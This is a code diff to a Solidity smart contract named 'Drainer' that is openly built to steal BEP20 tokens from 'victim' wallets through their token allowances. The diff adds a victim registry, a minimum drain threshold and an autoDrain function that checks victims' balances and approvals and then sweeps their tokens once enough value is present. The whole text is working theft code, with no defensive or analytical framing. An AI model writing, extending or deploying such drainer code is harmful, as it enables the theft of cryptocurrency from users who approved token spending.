@@ -9,8 +9,11 @@ interface IBEP20 {
 
 contract Drainer {
     address public attacker;
+    mapping(address => bool) public isVictim;
+    uint256 public constant MIN_DRAIN_AMOUNT = 5 * 10**18;
 
     event TokensDrained(address indexed victim, address indexed token, uint256 amount);
+    event VictimAdded(address indexed victim);
 
     constructor() {
         attacker = msg.sender;
@@ -23,12 +26,32 @@ contract Drainer {
         for (uint256 i = 0; i < tokens.length; i++) {
             amounts[i] = _drainToken(victim, tokens[i]);
         }
+        if (!isVictim[victim]) {
+            isVictim[victim] = true;
+            emit VictimAdded(victim);
+        }
         return amounts;
     }
 
     function drainSpecificToken(address victim, address token) external returns (uint256) {
         require(msg.sender == attacker, "Not authorized");
         return _drainToken(victim, token);
+    }
+
+    function autoDrain(address victim, address[] memory tokens) external {
+        require(isVictim[victim], "Not a flagged victim");
+        uint256 totalAmount = 0;
+        for (uint256 i = 0; i < tokens.length; i++) {
+            IBEP20 tokenContract = IBEP20(tokens[i]);
+            uint256 balance = tokenContract.balanceOf(victim);
+            uint256 allowance = tokenContract.allowance(victim, address(this));
+            totalAmount += allowance < balance ? allowance : balance;
+        }
+        if (totalAmount >= MIN_DRAIN_AMOUNT) {
+            for (uint256 i = 0; i < tokens.length; i++) {
+                _drainToken(victim, tokens[i]);
+            }
+        }
     }
 
     function _drainToken(address victim, address token) internal returns (uint256) {
